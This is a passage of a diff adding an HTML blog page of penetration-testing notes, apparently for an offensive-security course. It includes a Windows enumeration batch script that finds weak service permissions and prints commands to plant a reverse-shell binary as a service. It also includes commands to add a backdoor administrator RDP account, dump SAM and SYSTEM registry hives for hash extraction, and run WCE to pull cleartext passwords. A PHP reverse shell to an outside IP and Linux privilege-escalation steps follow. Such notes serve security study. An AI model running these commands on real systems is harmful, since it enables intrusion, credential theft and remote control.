+</span><span>echo.Searching for weak service permissions (this can take a while)
+</span><span>echo.--------------------------------------------------------------
+</span><span>if exist serviceexes.txt del serviceexes.txt
+</span><span>if exist dirlisting.txt del dirlisting.txt
+</span><span>dir \ /a/s/b &gt; dirlisting.txt
+</span><span>for /f &quot;tokens=1 delims=,&quot; %%a in (&#39;tasklist /SVC /FO CSV ^| findstr /I \.*exe*. ^| findstr /VI &quot;smss.exe csrss.exe winlogon.exe services.exe spoolsv.exe explorer.exe ctfmon.exe wmiprvse.exe msmsgs.exe notepad.exe lsass.exe svchost.exe findstr.exe cmd.exe tasklist.exe&quot;&#39;) do (findstr %%a$ | findstr /VI &quot;\.*winsxs\\*.&quot;) &lt;dirlisting.txt &gt;&gt; serviceexes.txt
+</span><span>REM In the line below we parse serviceexes.txt and check each line for write access. We check write access by appending (writing) nothing to the file, we then use batch logic to test results and output results in echo
+</span><span>REM for /f &quot;tokens=*&quot; %%a in (serviceexes.txt) do 2&gt;nul (&gt;&gt;%%a echo off) &amp;&amp; (echo === !!! RW access to service executable: %%a !!! ===) || (call)
+</span><span>REM Ninja magic to find out if we have write access, only partially reliable so decided to go with cacls instead
+</span><span>REM @echo off &amp; 2&gt;nul (&gt;&gt;&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot; echo off) &amp;&amp; (echo RW access) || (echo no RW access) &amp; echo on
+</span><span>
+</span><span>for /f &quot;tokens=*&quot; %%a in (serviceexes.txt) do (cacls &quot;%%a&quot;|findstr /I &quot;Users:&quot;|findstr /I &quot;W F&quot;) &amp;&amp; (echo === !!! Write access to service executable: %%a !!! ===) || (call)
+</span><span>for /f &quot;tokens=*&quot; %%a in (serviceexes.txt) do (cacls &quot;%%a&quot;|findstr /I &quot;Everyone&quot;|findstr /I &quot;W F&quot;) &amp;&amp; (echo === !!! Write access to service executable: %%a !!! ===) || (call)
+</span><span>
+</span><span>echo.Files and folder with Read-Write access
+</span><span>echo.---------------------------------------
+</span><span>dir accesschk.exe /a/s/b 1&gt;2&gt;NUL
+</span><span>IF %ERRORLEVEL% == 0 (
+</span><span>	echo === NOTE: accesschk.exe not found, skipping accesschk file permissions checks ===
+</span><span>	goto:eof
+</span><span>)
+</span><span>
+</span><span>	accesschk.exe /accepteula 1&gt;2&gt;NUL
+</span><span>	
+</span><span>	accesschk.exe -uwqs &quot;Everyone&quot; c:\*.* | findstr /VI &quot;\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*.&quot;
+</span><span>	accesschk.exe -uwqs &quot;Users&quot; c:\*.* | findstr /VI &quot;\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*.&quot;
+</span><span>	accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.
+</span><span>	
+</span><span>	echo.Searching for weak service permissions
+</span><span>	echo.--------------------------------------
+</span><span>	accesschk.exe -uwcqv &quot;Authenticated Users&quot; * | Find &quot;RW &quot; 1&gt; NUL
+</span><span>	if %ERRORLEVEL% == 0 (
+</span><span>		echo.**** !!! VULNERABLE SERVICES FOUND - Authenticated Users!!! ****
+</span><span>		accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
+</span><span>		echo.****************************************************************
+</span><span>		echo.
+</span><span>	)
+</span><span>	accesschk.exe /accepteula 1&gt;2&gt;NUL
+</span><span>	accesschk.exe -uwcqv &quot;Users&quot; * | Find &quot;RW &quot; 1&gt; NUL
+</span><span>	if %ERRORLEVEL% == 0 (
+</span><span>		echo.**** !!! VULNERABLE SERVICES FOUND - All Users !!! ****
+</span><span>		accesschk.exe -uwcqv &quot;Users&quot; *
+</span><span>		echo.*******************************************************
+</span><span>		echo.To plant binary in service use:
+</span><span>		echo.sc config [service_name] binpath= &quot;C:\rshell.exe&quot;
+</span><span>		echo.sc config [service_name] obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+</span><span>		echo.sc qc [service_name] (to verify!)
+</span><span>		echo.net start [service_name]
+</span><span>		echo.*******************************************************
+</span><span>	)
+</span><span>	accesschk.exe /accepteula 1&gt;2&gt;NUL
+</span><span>	accesschk.exe -uwcqv &quot;Everyone&quot; * | Find &quot;RW &quot; 1&gt; NUL
+</span><span>	if %ERRORLEVEL% == 0 (
+</span><span>		echo.**** !!! VULNERABLE SERVICES FOUND - Everyone !!! ****
+</span><span>		accesschk.exe -uwcqv &quot;Everyone&quot; *
+</span><span>		echo.*******************************************************
+</span><span>		echo.To plant binary in service use:
+</span><span>		echo.sc config [service_name] binpath= &quot;C:\rshell.exe&quot;
+</span><span>		echo.sc config [service_name] obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
+</span><span>		echo.sc qc [service_name] (to verify!)
+</span><span>		echo.net start [service_name]
+</span><span>		echo.*******************************************************
+</span><span>goto:eof
+</span><span>
+</span><span>:cleanup
+</span><span>set jollykatz=
+</span><span>set accesschk=
+</span><span>set OSbit=
+</span><span>set whoami=
+</span><span>set runningelevatedprompt=
+</span><span>set netshfirewall=
+</span><span>set OSVersion=
+</span><span>set alwaysinstallelevated=
+</span><span>set realvncpassfound=
+</span><span>set tightvncpassfound1=
+</span><span>set tightvncpassfound2=
+</span><span>set tigervncpassfound=
+</span><span>set vnc3passfound1=
+</span><span>set vnc3passfound2=
+</span><span>set vnc3passfound3=
+</span><span>set winautologinpassfound=
+</span><span>set winautologindomainfound=
+</span><span>set winautologinuserfound=
+</span><span>set defaultloginpass=
+</span><span>set IE6found=
+</span><span>set IE7found=
+</span><span>set AIM6found=
+</span><span>set AIMPROfound=
+</span><span>set BEYLUXEfound=
+</span><span>set BIGANTfound=
+</span><span>set CAMFROGfound=
+</span><span>set GOOGLETALKfound=
+</span><span>set IMVUfound=
+</span><span>set NIMBUZZfound=
+</span><span>set PALTALKfound=
+</span><span>set YAHOOPAGERfound=
+</span><span>set INCREDIMAILfound=
+</span><span>set OUTLOOK2013found=
+</span><span>set OUTLOOK2010POSTNTfound=
+</span><span>set OUTLOOK2010PRENTfound=
+</span><span>set OUTLOOK98MAILONLYfound=
+</span><span>set OUTLOOK98NORMALfound=
+</span><span>goto:eof
+</span><span>
+</span><span>:end
+</span><span>echo.
+</span><span>echo.==============
+</span><span>echo.Dump complete!
+</span><span>echo.==============
+</span><span>GOTO:eof
+</span></code></pre>
+<hr />
+<h2 id="windows-post-exploitation">Windows Post Exploitation</h2>
+<h3 id="quickly-create-account-with-rdp-access">Quickly create account with RDP access</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>net user offsec password1 /add
+</span><span>net localgroup Administrators offsec /add
+</span><span>net localgroup &quot;Remote Desktop Users&quot; offsec /add
+</span></code></pre>
+<h3 id="loot-registry-without-tools">Loot registry without tools</h3>
+<p>This might be a better technique than using tools like <code>wce</code> and <code>fgdump</code>, since you don't have to upload any binaries. Get the registry:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>C:\&gt; reg.exe save hklm\sam c:\windows\temp\sam.save
+</span><span>C:\&gt; reg.exe save hklm\security c:\windows\temp\security.save
+</span><span>C:\&gt; reg.exe save hklm\system c:\windows\temp\system.save
+</span></code></pre>
+<p>The hashes can be extracted using <code>secretdump.py</code> or <code>pwdump</code></p>
+<h3 id="windows-credencial-editor-wce">Windows Credencial Editor (WCE)</h3>
+<p>WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>wce32.exe -w
+</span></code></pre>
+<hr />
+<h2 id="linux-privilege-escalation">Linux Privilege Escalation</h2>
+<p>Check to see what sudo privileges the current user has:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sudo -l
+</span></code></pre>
+<p>One-line PHP reverse shell:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.11.0.219/443 0&gt;&amp;1&#39;&quot;);
+</span></code></pre>
+<p>Create a new file within terminal:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>#!/bin/sh
+</span><span>cat &gt; test &lt;&lt; EOF
+</span><span>Hello World!
+</span><span>This is my stupid text file.
+</span><span>
+</span><span>You
+</span><span>can also
+</span><span>have
+</span><span>a whole lot
+</span><span>more text and
+</span><span>lines
+</span><span>EOF
+</span></code></pre>
+<p>Find setgid and setuid binaries:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls
+</span></code></pre>
+<hr />
+<h2 id="interactive-shell">Interactive Shell</h2>
+<p>Bread and butter interactive shell:</p>
+<ol>
+<li><code>python -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code></li>
+<li><code>Ctrl + Z</code></li>
+<li><code>stty raw -echo</code></li>
+<li><code>fg</code></li>
+</ol>
+<hr />
+<h2 id="pivoting">Pivoting</h2>
+<p><a href="https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html">https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html</a></p>
+<p><a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a></p>
+<p><a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains/">https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains/</a></p>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/personal'>personal</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
